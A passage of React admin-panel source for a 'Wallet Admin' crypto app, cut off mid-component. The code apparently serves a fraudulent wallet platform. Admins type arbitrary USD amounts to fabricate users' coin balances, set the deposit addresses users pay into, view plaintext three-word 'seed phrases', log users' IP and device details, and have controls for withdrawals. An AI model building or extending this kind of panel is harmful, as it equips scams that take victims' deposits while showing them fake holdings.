import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient, apiRequest } from "@/lib/queryClient";
import {
  Trash2, Plus, Edit2, Check, X, Users, Wallet, LogOut,
  Eye, EyeOff, ChevronDown, ChevronUp, DollarSign, MapPin, Copy,
  Globe, Smartphone, Clock, Monitor, Activity, MapPinned, Timer,
  ArrowDownLeft, ArrowUpRight, Building2, ToggleLeft, ToggleRight, Banknote,
} from "lucide-react";

interface UserBalance {
  id: string;
  userId: string;
  tokenSymbol: string;
  tokenName: string;
  balance: number;
  walletAddress: string | null;
  iconUrl: string | null;
  iconColor: string;
}

interface User {
  id: string;
  seedPhrase: string;
  walletAddress: string | null;
  name: string;
  createdAt: string;
  lastActive: string | null;
  ipAddress: string | null;
  userAgent: string | null;
  deviceInfo: string | null;
  depositsEnabled: boolean;
  withdrawalsEnabled: boolean;
  bankTransfersEnabled: boolean;
  balances: UserBalance[];
}

interface UserTransaction {
  id: string;
  userId: string;
  type: string;
  asset: string;
  amount: number;
  amountUsd: number;
  status: string;
  description: string | null;
  metadata: string | null;
  createdAt: string;
  createdBy: string;
}

const COIN_OPTIONS = [
  { symbol: "BTC", name: "Bitcoin", price: 68829, iconColor: "#f7931a", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/bitcoin/standard.png" },
  { symbol: "ETH", name: "Ethereum", price: 2054.38, iconColor: "#627eea", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/ethereum/standard.png" },
  { symbol: "SOL", name: "Solana", price: 83.97, iconColor: "#00ffa3", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/solana/standard.png" },
  { symbol: "XRP", name: "XRP", price: 1.4263, iconColor: "#00AAE4", iconUrl: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png" },
  { symbol: "USDC", name: "USDC", price: 1.0, iconColor: "#2775ca", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/usd-coin/standard.png" },
  { symbol: "USDT", name: "Tether", price: 1.0, iconColor: "#26a17b", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/tether/standard.png" },
  { symbol: "DOGE", name: "Dogecoin", price: 0.128, iconColor: "#c2a633", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/dogecoin/standard.png" },
  { symbol: "LINK", name: "Chainlink", price: 12.45, iconColor: "#2a5ada", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/chainlink/standard.png" },
  { symbol: "BNB", name: "BNB", price: 560, iconColor: "#f3ba2f", iconUrl: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png" },
  { symbol: "LTC", name: "Litecoin", price: 73.50, iconColor: "#bfbbbb", iconUrl: "https://cdn.jsdelivr.net/gh/simplr-sh/coin-logos/images/litecoin/standard.png" },
];

function generateSeedPhrase(): string {
  const words = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
    "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
    "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
    "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
    "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
    "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone",
    "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among",
    "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry",
    "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
    "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april",
    "arch", "arctic", "area", "arena", "argue", "arm", "armor", "army",
  ];
  const phrase: string[] = [];
  for (let i = 0; i < 3; i++) {
    phrase.push(words[Math.floor(Math.random() * words.length)]);
  }
  return phrase.join(" ");
}

function formatUsd(amount: number): string {
  return new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(amount);
}

export default function AdminPage() {
  const [authenticated, setAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");

  const handleLogin = async () => {
    try {
      const res = await apiRequest("POST", "/api/admin/login", { password });
      if (res.ok) {
        setAuthenticated(true);
        setLoginError("");
      }
    } catch {
      setLoginError("Invalid password");
      setPassword("");
    }
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-[#000] flex items-center justify-center p-4">
        <div className="w-full max-w-sm">
          <div className="flex items-center justify-center mb-8">
            <div className="w-16 h-16 bg-gradient-to-br from-[#1c1c1e] to-[#2c2c2e] rounded-2xl flex items-center justify-center shadow-xl">
              <Users className="w-8 h-8 text-white" />
            </div>
          </div>
          <h1 className="text-white text-2xl font-bold text-center mb-1" data-testid="text-admin-title">Admin Panel</h1>
          <p className="text-[#636366] text-sm text-center mb-8">Wallet Management System</p>
          {loginError && (
            <p className="text-[#FF453A] text-sm text-center mb-4" data-testid="text-login-error">{loginError}</p>
          )}
          <input
            data-testid="input-admin-password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && handleLogin()}
            placeholder="Enter password"
            className="w-full bg-[#1c1c1e] border border-[#2c2c2e] rounded-2xl px-5 py-4 text-white text-base placeholder:text-[#48484A] outline-none focus:border-[#48484A] transition-colors mb-4"
            autoFocus
          />
          <button
            data-testid="button-admin-login"
            onClick={handleLogin}
            className="w-full py-4 bg-white text-black rounded-2xl text-base font-semibold active:bg-gray-200 transition-colors"
          >
            Login
          </button>
        </div>
      </div>
    );
  }

  return <AdminDashboard onLogout={() => { setAuthenticated(false); setPassword(""); }} />;
}

function AdminDashboard({ onLogout }: { onLogout: () => void }) {
  const [expandedUser, setExpandedUser] = useState<string | null>(null);
  const [showAddUser, setShowAddUser] = useState(false);
  const [newUserName, setNewUserName] = useState("");
  const [newUserSeedPhrase, setNewUserSeedPhrase] = useState("");
  const [showAddBalance, setShowAddBalance] = useState<string | null>(null);
  const [selectedCoin, setSelectedCoin] = useState(COIN_OPTIONS[0].symbol);
  const [balanceUsdAmount, setBalanceUsdAmount] = useState("");
  const [balanceWalletAddress, setBalanceWalletAddress] = useState("");
  const [editingBalance, setEditingBalance] = useState<string | null>(null);
  const [editBalanceUsd, setEditBalanceUsd] = useState("");
  const [editBalanceAddress, setEditBalanceAddress] = useState("");
  const [editingUser, setEditingUser] = useState<string | null>(null);
  const [editUserName, setEditUserName] = useState("");
  const [seedVisibility, setSeedVisibility] = useState<Record<string, boolean>>({});

  const { data: users = [], isLoading } = useQuery<User[]>({
    queryKey: ["/api/admin/users"],
  });

  const createUserMutation = useMutation({
    mutationFn: async (data: { name: string; seedPhrase: string; walletAddress: string }) => {
      const res = await apiRequest("POST", "/api/admin/users", data);
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/users"] });
      setShowAddUser(false);
      setNewUserName("");
      setNewUserSeedPhrase("");
    },
  });

  const updateUserMutation = useMutation({
    mutationFn: async ({ id, data }: { id: string; data: { name?: string } }) => {
      const res = await apiRequest("PATCH", `/api/admin/users/${id}`, data);
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/users"] });
      setEditingUser(null);
    },
  });

  const deleteUserMutation = useMutation({
    mutationFn: async (id: string) => {
      await apiRequest("DELETE", `/api/admin/users/${id}`);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/users"] });
    },
  });

  const addBalanceMutation = useMutation({
    mutationFn: async ({ userId, data }: { userId: string; data: any }) => {
      const res = await apiRequest("POST", `/api/admin/users/${userId}/balances`, data);
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/users"] });
      setShowAddBalance(null);
      setBalanceUsdAmount("");
      setBalanceWalletAddress("");
      setSelectedCoin(COIN_OPTIONS[0].symbol);
    },
  });

  const updateBalanceMutation = useMutation({
    mutationFn: async ({ id, balance, walletAddress }: { id: string; balance: number; walletAddress?: string }) => {
      const res = await apiRequest("PATCH", `/api/admin/balances/${id}`, { balance, walletAddress });
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/users"] });
      setEditingBalance(null);
    },
  });

  const deleteBalanceMutation = useMutation({
    mutationFn: async (id: string) => {
      await apiRequest("DELETE", `/api/admin/balances/${id}`);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/users"] });
    },
  });

  const handleAddUser = () => {
    if (!newUserName.trim() || !newUserSeedPhrase.trim()) return;
    createUserMutation.mutate({
      name: newUserName.trim(),
      seedPhrase: newUserSeedPhrase.trim(),
      walletAddress: "",
    });
  };

  const handleAddBalance = (userId: string) => {
    const coin = COIN_OPTIONS.find(c => c.symbol === selectedCoin);
    if (!coin || !balanceUsdAmount) return;
    const usdValue = parseFloat(balanceUsdAmount);
    const tokenAmount = usdValue / coin.price;
    addBalanceMutation.mutate({
      userId,
      data: {
        tokenSymbol: coin.symbol,
        tokenName: coin.name,
        balance: tokenAmount,
        walletAddress: balanceWalletAddress.trim() || null,
        iconUrl: coin.iconUrl,
        iconColor: coin.iconColor,
      },
    });
  };

  const handleSaveBalance = (bal: UserBalance) => {
    const coin = COIN_OPTIONS.find(c => c.symbol === bal.tokenSymbol);
    const price = coin?.price || 1;
    const usdValue = parseFloat(editBalanceUsd) || 0;
    const tokenAmount = usdValue / price;
    updateBalanceMutation.mutate({ id: bal.id, balance: tokenAmount, walletAddress: editBalanceAddress });
  };

  const getUsdValue = (bal: UserBalance) => {
    const coin = COIN_OPTIONS.find(c => c.symbol === bal.tokenSymbol);
    return bal.balance * (coin?.price || 1);
  };

  const getTotalUsd = (balances: UserBalance[]) => {
    return balances.reduce((sum, bal) => sum + getUsdValue(bal), 0);
  };

  const copySeed = (phrase: string) => {
    navigator.clipboard.writeText(phrase).catch(() => {});
  };

  return (
    <div className="min-h-screen bg-[#000] text-white">
      <div className="sticky top-0 z-10 bg-[#000]/90 backdrop-blur-xl border-b border-[#1c1c1e]">
        <div className="max-w-2xl mx-auto px-4 py-4 flex items-center justify-between">
          <div>
            <h1 className="text-lg font-bold" data-testid="text-admin-dashboard-title">Wallet Admin</h1>
            <p className="text-[#636366] text-xs">{users.length} user{users.length !== 1 ? "s" : ""} managed</p>
          </div>
          <button
            data-testid="button-admin-logout"
            onClick={onLogout}
            className="p-2.5 bg-[#1c1c1e] rounded-xl text-[#8E8E93] hover:text-white transition-colors"
          >
            <LogOut className="w-4 h-4" />
          </button>
        </div>
      </div>

      <div className="max-w-2xl mx-auto px-4 py-6 space-y-4">
        <button
          data-testid="button-add-user"
          onClick={() => {
            setShowAddUser(true);
            setNewUserSeedPhrase(generateSeedPhrase());
          }}
          className="w-full flex items-center justify-center gap-2 py-3.5 bg-white text-black rounded-2xl text-sm font-semibold active:bg-gray-100 transition-colors"
        >
          <Plus className="w-4 h-4" />
          New User
        </button>

        {showAddUser && (
          <div className="bg-[#1c1c1e] rounded-2xl p-5 space-y-4 border border-[#2c2c2e]">
            <h3 className="text-base font-semibold flex items-center gap-2">
              <Users className="w-4 h-4 text-[#636366]" />
              Create User
            </h3>
            <div>
              <label className="text-[#636366] text-xs font-medium mb-1.5 block uppercase tracking-wider">Display Name</label>
              <input
                data-testid="input-new-user-name"
                type="text"
                value={newUserName}
                onChange={(e) => setNewUserName(e.target.value)}
                placeholder="Enter name"
                className="w-full bg-[#0a0a0a] border border-[#2c2c2e] rounded-xl px-4 py-3 text-white text-sm placeholder:text-[#3a3a3c] outline-none focus:border-[#48484A] transition-colors"
              />
            </div>
            <div>
              <label className="text-[#636366] text-xs font-medium mb-1.5 block uppercase tracking-wider">Seed Phrase (first 3 words identify user)</label>
              <div className="relative">
                <textarea
                  data-testid="input-new-user-seed"
                  value={newUserSeedPhrase}
                  onChange={(e) => setNewUserSeedPhrase(e.target.value)}
                  placeholder="e.g. dog cat fart"
                  rows={2}
                  className="w-full bg-[#0a0a0a] border border-[#2c2c2e] rounded-xl px-4 py-3 text-white text-sm placeholder:text-[#3a3a3c] outline-none resize-none focus:border-[#48484A] transition-colors font-mono"
                />
              </div>
              <button
                data-testid="button-generate-seed"
                onClick={() => setNewUserSeedPhrase(generateSeedPhrase())}
                className="text-[#0A84FF] text-xs font-medium mt-1.5 hover:text-[#409CFF] transition-colors"
              >
                Generate random phrase
              </button>
            </div>
            <div className="flex gap-3 pt-1">
              <button
                data-testid="button-cancel-add-user"
                onClick={() => { setShowAddUser(false); setNewUserName(""); setNewUserSeedPhrase(""); }}
                className="flex-1 py-3 bg-[#2c2c2e] text-white rounded-xl text-sm font-medium hover:bg-[#3a3a3c] transition-colors"
              >
                Cancel
              </button>
              <button
                data-testid="button-save-user"
                onClick={handleAddUser}
                disabled={createUserMutation.isPending || !newUserName.trim() || !newUserSeedPhrase.trim()}
                className="flex-1 py-3 bg-[#0A84FF] text-white rounded-xl text-sm font-semibold disabled:opacity-40 hover:bg-[#409CFF] transition-colors"
              >
                {createUserMutation.isPending ? "Creating..." : "Create User"}
              </button>
            </div>
          </div>
        )}

        {isLoading ? (
          <div className="flex items-center justify-center py-20">
            <div className="w-6 h-6 border-2 border-[#0A84FF] border-t-transparent rounded-full animate-spin" />
          </div>
        ) : users.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-20 text-center">
            <div className="w-16 h-16 bg-[#1c1c1e] rounded-2xl flex items-center justify-center mb-4">
              <Wallet className="w-8 h-8 text-[#3a3a3c]" />
            </div>
            <p className="text-[#8E8E93] text-base font-medium">No users yet</p>
            <p className="text-[#3a3a3c] text-sm mt-1">Create a user to get started</p>
          </div>
        ) : (
          <div className="space-y-3">
            {users.map((user) => (
              <UserCard
                key={user.id}
                user={user}
                expanded={expandedUser === user.id}
                onToggle={() => setExpandedUser(expandedUser === user.id ? null : user.id)}
                onDelete={() => { if (confirm("Delete this user and all their data?")) deleteUserMutation.mutate(user.id); }}
                seedVisible={seedVisibility[user.id] || false}
                onToggleSeed={() => setSeedVisibility(prev => ({ ...prev, [user.id]: !prev[user.id] }))}
                onCopySeed={() => copySeed(user.seedPhrase)}
                editingUser={editingUser === user.id}
                editUserName={editUserName}
                onStartEditUser={() => { setEditingUser(user.id); setEditUserName(user.name); }}
                onEditUserName={setEditUserName}
                onSaveUser={() => updateUserMutation.mutate({ id: user.id, data: { name: editUserName } })}
                onCancelEditUser={() => setEditingUser(null)}
                showAddBalance={showAddBalance === user.id}
                onToggleAddBalance={() => setShowAddBalance(showAddBalance === user.id ? null : user.id)}
                selectedCoin={selectedCoin}
                onSelectCoin={setSelectedCoin}
                balanceUsdAmount={balanceUsdAmount}
                onBalanceUsdChange={setBalanceUsdAmount}
                balanceWalletAddress={balanceWalletAddress}
                onBalanceAddressChange={setBalanceWalletAddress}
                onAddBalance={() => handleAddBalance(user.id)}
                addingBalance={addBalanceMutation.isPending}
                onCancelAddBalance={() => { setShowAddBalance(null); setBalanceUsdAmount(""); setBalanceWalletAddress(""); }}
                editingBalance={editingBalance}
                editBalanceUsd={editBalanceUsd}
                editBalanceAddress={editBalanceAddress}
                onStartEditBalance={(bal) => {
                  setEditingBalance(bal.id);
                  setEditBalanceUsd(String(Math.round(getUsdValue(bal) * 100) / 100));
                  setEditBalanceAddress(bal.walletAddress || "");
                }}
                onEditBalanceUsd={setEditBalanceUsd}
                onEditBalanceAddress={setEditBalanceAddress}
                onSaveBalance={(bal) => handleSaveBalance(bal)}
                onCancelEditBalance={() => setEditingBalance(null)}
                onDeleteBalance={(id) => deleteBalanceMutation.mutate(id)}
                getUsdValue={getUsdValue}
                getTotalUsd={getTotalUsd}
              />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

interface UserCardProps {
  user: User;
  expanded: boolean;
  onToggle: () => void;
  onDelete: () => void;
  seedVisible: boolean;
  onToggleSeed: () => void;
  onCopySeed: () => void;
  editingUser: boolean;
  editUserName: string;
  onStartEditUser: () => void;
  onEditUserName: (name: string) => void;
  onSaveUser: () => void;
  onCancelEditUser: () => void;
  showAddBalance: boolean;
  onToggleAddBalance: () => void;
  selectedCoin: string;
  onSelectCoin: (coin: string) => void;
  balanceUsdAmount: string;
  onBalanceUsdChange: (v: string) => void;
  balanceWalletAddress: string;
  onBalanceAddressChange: (v: string) => void;
  onAddBalance: () => void;
  addingBalance: boolean;
  onCancelAddBalance: () => void;
  editingBalance: string | null;
  editBalanceUsd: string;
  editBalanceAddress: string;
  onStartEditBalance: (bal: UserBalance) => void;
  onEditBalanceUsd: (v: string) => void;
  onEditBalanceAddress: (v: string) => void;
  onSaveBalance: (bal: UserBalance) => void;
  onCancelEditBalance: () => void;
  onDeleteBalance: (id: string) => void;
  getUsdValue: (bal: UserBalance) => number;
  getTotalUsd: (balances: UserBalance[]) => number;
}

function UserCard(props: UserCardProps) {
  const { user, expanded, onToggle, onDelete, seedVisible, onToggleSeed, onCopySeed } = props;
  const totalUsd = props.getTotalUsd(user.balances);

  return (
    <div className="bg-[#1c1c1e] rounded-2xl overflow-hidden border border-[#2c2c2e]" data-testid={`card-user-${user.id}`}>
      <button
        data-testid={`button-expand-user-${user.id}`}
        onClick={onToggle}
        className="w-full flex items-center gap-3 p-4 text-left"
      >
        <div className="w-11 h-11 bg-gradient-to-br from-[#2c2c2e] to-[#1c1c1e] rounded-full flex items-center justify-center flex-shrink-0 border border-[#3a3a3c]">
          <span className="text-white text-sm font-bold">{user.name.charAt(0).toUpperCase()}</span>
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-white text-[15px] font-semibold truncate">{user.name}</p>
          <p className="text-[#636366] text-xs mt-0.5">
            {user.balances.length} coin{user.balances.length !== 1 ? "s" : ""} · {formatUsd(totalUsd)}
          </p>
        </div>
        {expanded ? (
          <ChevronUp className="w-5 h-5 text-[#3a3a3c]" />
        ) : (
          <ChevronDown className="w-5 h-5 text-[#3a3a3c]" />
        )}
      </button>

      {expanded && (
        <div className="border-t border-[#2c2c2e]">
          <div className="p-4 space-y-4">
            <div className="bg-[#0a0a0a] rounded-xl p-3.5">
              <div className="flex items-center justify-between mb-2">
                <span className="text-[#636366] text-[11px] font-medium uppercase tracking-wider">Seed Phrase</span>
                <div className="flex items-center gap-1">
                  <button
                    data-testid={`button-copy-seed-${user.id}`}
                    onClick={onCopySeed}
                    className="p-1.5 text-[#636366] hover:text-[#0A84FF] rounded-lg transition-colors"
                  >
                    <Copy className="w-3.5 h-3.5" />
                  </button>
                  <button
                    data-testid={`button-toggle-seed-${user.id}`}
                    onClick={onToggleSeed}
                    className="p-1.5 text-[#636366] hover:text-white rounded-lg transition-colors"
                  >
                    {seedVisible ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                  </button>
                </div>
              </div>
              <p className="text-white text-[13px] font-mono break-all leading-relaxed" data-testid={`text-seed-${user.id}`}>
                {seedVisible ? user.seedPhrase : "•••• •••• ••••"}
              </p>
            </div>

            <DeviceInfoSection user={user} />
            <SessionLogSection userId={user.id} />
            <WalletActivityControls user={user} />
            <UserTransactionsSection userId={user.id} />

            {props.editingUser ? (
              <div className="space-y-3">
                <div>
                  <label className="text-[#636366] text-[11px] font-medium mb-1 block uppercase tracking-wider">Name</label>
                  <input
                    data-testid={`input-edit-user-name-${user.id}`}
                    type="text"
                    value={props.editUserName}
                    onChange={(e) => props.onEditUserName(e.target.value)}
                    className="w-full bg-[#0a0a0a] border border-[#2c2c2e] rounded-xl px-4 py-2.5 text-white text-sm outline-none focus:border-[#48484A]"
                    autoFocus
                  />
                </div>
                <div className="flex gap-2">
                  <button
                    data-testid={`button-cancel-edit-user-${user.id}`}
                    onClick={props.onCancelEditUser}
                    className="flex-1 py-2.5 bg-[#2c2c2e] text-white rounded-xl text-xs font-medium"
                  >
                    Cancel
                  </button>
                  <button
                    data-testid={`button-save-edit-user-${user.id}`}
                    onClick={props.onSaveUser}
                    className="flex-1 py-2.5 bg-[#0A84FF] text-white rounded-xl text-xs font-semibold"
                  >
                    Save
                  </button>
                </div>
              </div>
            ) : (
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <button
                    data-testid={`button-edit-user-${user.id}`}
                    onClick={props.onStartEditUser}
                    className="text-[#0A84FF] text-xs font-medium hover:text-[#409CFF] transition-colors"
                  >
                    Edit Name
                  </button>
                  <span className="text-[#2c2c2e]">·</span>
                  <button
                    data-testid={`button-delete-user-${user.id}`}
                    onClick={onDelete}
                    className="text-[#FF453A] text-xs font-medium hover:text-[#FF6961] transition-colors"
                  >
                    Delete User
                  </button>
                </div>
              </div>
            )}

            <div className="pt-1">
              <div className="flex items-center justify-between mb-3">
                <h4 className="text-[11px] font-medium text-[#636366] uppercase tracking-wider">Coins & Balances</h4>
                <button
                  data-testid={`button-add-balance-${user.id}`}
                  onClick={props.onToggleAddBalance}
                  className="flex items-center gap-1 text-xs text-[#0A84FF] font-medium hover:text-[#409CFF] transition-colors"
                >
                  <Plus className="w-3.5 h-3.5" />
                  Add Coin
                </button>
              </div>

              {props.showAddBalance && (
                <AddBalanceForm
                  userId={user.id}
                  selectedCoin={props.selectedCoin}
                  onSelectCoin={props.onSelectCoin}
                  balanceUsdAmount={props.balanceUsdAmount}
                  onBalanceUsdChange={props.onBalanceUsdChange}
                  balanceWalletAddress={props.balanceWalletAddress}
                  onBalanceAddressChange={props.onBalanceAddressChange}
                  onAdd={props.onAddBalance}
                  adding={props.addingBalance}
                  onCancel={props.onCancelAddBalance}
                />
              )}

              {user.balances.length === 0 && !props.showAddBalance ? (
                <div className="text-center py-6">
                  <p className="text-[#3a3a3c] text-sm">No coins added yet</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {user.balances.map((bal) => (
                    <BalanceRow
                      key={bal.id}
                      bal={bal}
                      editing={props.editingBalance === bal.id}
                      editUsd={props.editBalanceUsd}
                      editAddress={props.editBalanceAddress}
                      onStartEdit={() => props.onStartEditBalance(bal)}
                      onEditUsd={props.onEditBalanceUsd}
                      onEditAddress={props.onEditBalanceAddress}
                      onSave={() => props.onSaveBalance(bal)}
                      onCancel={props.onCancelEditBalance}
                      onDelete={() => props.onDeleteBalance(bal.id)}
                      usdValue={props.getUsdValue(bal)}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function AddBalanceForm({ userId, selectedCoin, onSelectCoin, balanceUsdAmount, onBalanceUsdChange, balanceWalletAddress, onBalanceAddressChange, onAdd, adding, onCancel }: {
  userId: string;
  selectedCoin: string;
  onSelectCoin: (v: string) => void;
  balanceUsdAmount: string;
  onBalanceUsdChange: (v: string) => void;
  balanceWalletAddress: string;
  onBalanceAddressChange: (v: string) => void;
  onAdd: () => void;
  adding: boolean;
  onCancel: () => void;
}) {
  const coin = COIN_OPTIONS.find(c => c.symbol === selectedCoin);
  const usdVal = parseFloat(balanceUsdAmount) || 0;
  const tokenAmount = coin ? usdVal / coin.price : 0;

  return (
    <div className="bg-[#0a0a0a] rounded-xl p-4 mb-3 space-y-3 border border-[#2c2c2e]">
      <div>
        <label className="text-[#636366] text-[11px] font-medium mb-1.5 block uppercase tracking-wider">Select Coin</label>
        <div className="grid grid-cols-3 gap-1.5">
          {COIN_OPTIONS.map(c => (
            <button
              key={c.symbol}
              data-testid={`button-select-coin-${c.symbol}-${userId}`}
              onClick={() => onSelectCoin(c.symbol)}
              className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition-colors ${
                selectedCoin === c.symbol
                  ? "bg-[#0A84FF]/20 text-[#0A84FF] border border-[#0A84FF]/40"
                  : "bg-[#1c1c1e] text-[#8E8E93] border border-transparent hover:bg-[#2c2c2e]"
              }`}
            >
              <img src={c.iconUrl} alt={c.symbol} className="w-4 h-4 rounded-full" />
              {c.symbol}
            </button>
          ))}
        </div>
      </div>
      <div>
        <label className="text-[#636366] text-[11px] font-medium mb-1.5 block uppercase tracking-wider">Amount (USD)</label>
        <div className="relative">
          <DollarSign className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-[#636366]" />
          <input
            data-testid={`input-balance-amount-${userId}`}
            type="number"
            step="any"
            value={balanceUsdAmount}
            onChange={(e) => onBalanceUsdChange(e.target.value)}
            placeholder="0.00"
            className="w-full bg-[#1c1c1e] border border-[#2c2c2e] rounded-xl pl-10 pr-4 py-3 text-white text-sm placeholder:text-[#3a3a3c] outline-none focus:border-[#48484A] transition-colors"
          />
        </div>
        {usdVal > 0 && coin && (
          <p className="text-[#636366] text-[11px] mt-1.5">
            = {tokenAmount < 1 ? tokenAmount.toFixed(8) : tokenAmount.toLocaleString("en-US", { maximumFractionDigits: 4 })} {coin.symbol}
          </p>
        )}
      </div>
      <div>
        <label className="text-[#636366] text-[11px] font-medium mb-1.5 block uppercase tracking-wider">
          <MapPin className="w-3 h-3 inline mr-1" />
          Deposit Address
        </label>
        <input
          data-testid={`input-balance-address-${userId}`}
          type="text"
          value={balanceWalletAddress}
          onChange={(e) => onBalanceAddressChange(e.target.value)}
          placeholder="Wallet address for this coin"
          className="w-full bg-[#1c1c1e] border border-[#2c2c2e] rounded-xl px-4 py-3 text-white text-sm placeholder:text-[#3a3a3c] outline-none font-mono focus:border-[#48484A] transition-colors"
        />
      </div>
      <div className="flex gap-2 pt-1">
        <button
          data-testid={`button-cancel-balance-${userId}`}
          onClick={onCancel}
          className="flex-1 py-2.5 bg-[#1c1c1e] text-white rounded-xl text-xs font-medium hover:bg-[#2c2c2e] transition-colors"
        >
          Cancel
        </button>
        <button
          data-testid={`button-save-balance-${userId}`}
          onClick={onAdd}
          disabled={adding || !balanceUsdAmount}
          className="flex-1 py-2.5 bg-[#0A84FF] text-white rounded-xl text-xs font-semibold disabled:opacity-40 hover:bg-[#409CFF] transition-colors"
        >
          {adding ? "Adding..." : "Add Coin"}
        </button>
      </div>
    </div>
  );
}

function BalanceRow({ bal, editing, editUsd, editAddress, onStartEdit, onEditUsd, onEditAddress, onSave, onCancel, onDelete, usdValue }: {
  bal: UserBalance;
  editing: boolean;
  editUsd: string;
  editAddress: string;
  onStartEdit: () => void;
  onEditUsd: (v: string) => void;
  onEditAddress: (v: string) => void;
  onSave: () => void;
  onCancel: () => void;
  onDelete: () => void;
  usdValue: number;
}) {
  if (editing) {
    return (
      <div className="bg-[#0a0a0a] rounded-xl p-3.5 space-y-3 border border-[#0A84FF]/30">
        <div className="flex items-center gap-2 mb-1">
          {bal.iconUrl ? (
            <img src={bal.iconUrl} alt={bal.tokenSymbol} className="w-6 h-6 rounded-full" />
          ) : (
            <div className="w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-bold" style={{ backgroundColor: bal.iconColor + "25", color: bal.iconColor }}>
              {bal.tokenSymbol.charAt(0)}
            </div>
          )}
          <span className="text-white text-sm font-semibold">{bal.tokenSymbol}</span>
        </div>
        <div>
          <label className="text-[#636366] text-[10px] font-medium mb-1 block uppercase tracking-wider">Balance (USD)</label>
          <div className="relative">
            <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[#636366]" />
            <input
              data-testid={`input-edit-balance-${bal.id}`}
              type="number"
              step="any"
              value={editUsd}
              onChange={(e) => onEditUsd(e.target.value)}
              className="w-full bg-[#1c1c1e] border border-[#2c2c2e] rounded-lg pl-9 pr-4 py-2 text-white text-sm outline-none focus:border-[#48484A]"
              autoFocus
            />
          </div>
        </div>
        <div>
          <label className="text-[#636366] text-[10px] font-medium mb-1 block uppercase tracking-wider">Deposit Address</label>
          <input
            data-testid={`input-edit-balance-address-${bal.id}`}
            type="text"
            value={editAddress}
            onChange={(e) => onEditAddress(e.target.value)}
            placeholder="Wallet address"
            className="w-full bg-[#1c1c1e] border border-[#2c2c2e] rounded-lg px-3.5 py-2 text-white text-sm outline-none font-mono focus:border-[#48484A]"
          />
        </div>
        <div className="flex gap-2">
          <button
            data-testid={`button-cancel-edit-balance-${bal.id}`}
            onClick={onCancel}
            className="flex-1 py-2 bg-[#1c1c1e] text-white rounded-lg text-xs font-medium"
          >
            Cancel
          </button>
          <button
            data-testid={`button-save-edit-balance-${bal.id}`}
            onClick={onSave}
            className="flex-1 py-2 bg-[#0A84FF] text-white rounded-lg text-xs font-semibold"
          >
            Save
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="flex items-center gap-3 py-2.5 px-3 bg-[#0a0a0a] rounded-xl group">
      {bal.iconUrl ? (
        <img src={bal.iconUrl} alt={bal.tokenSymbol} className="w-9 h-9 rounded-full" />
      ) : (
        <div className="w-9 h-9 rounded-full flex items-center justify-center text-xs font-bold" style={{ backgroundColor: bal.iconColor + "25", color: bal.iconColor }}>
          {bal.tokenSymbol.charAt(0)}
        </div>
      )}
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-1.5">
          <p className="text-white text-sm font-semibold">{bal.tokenSymbol}</p>
          <p className="text-[#3a3a3c] text-[11px]">{bal.tokenName}</p>
        </div>
        {bal.walletAddress && (
          <p className="text-[#3a3a3c] text-[10px] font-mono truncate mt-0.5">{bal.walletAddress.slice(0, 12)}...{bal.walletAddress.slice(-6)}</p>
        )}
      </div>
      <div className="text-right">
        <p className="text-white text-sm font-semibold" data-testid={`text-balance-${bal.id}`}>{formatUsd(usdValue)}</p>
        <p className="text-[#636366] text-[11px]">
          {bal.balance < 1 ? bal.balance.toFixed(6) : bal.balance.toLocaleString("en-US", { maximumFractionDigits: 4 })} {bal.tokenSymbol}
        </p>
      </div>
      <div className="flex items-center gap-0.5 opacity-60 group-hover:opacity-100 transition-opacity">
        <button
          data-testid={`button-edit-balance-${bal.id}`}
          onClick={onStartEdit}
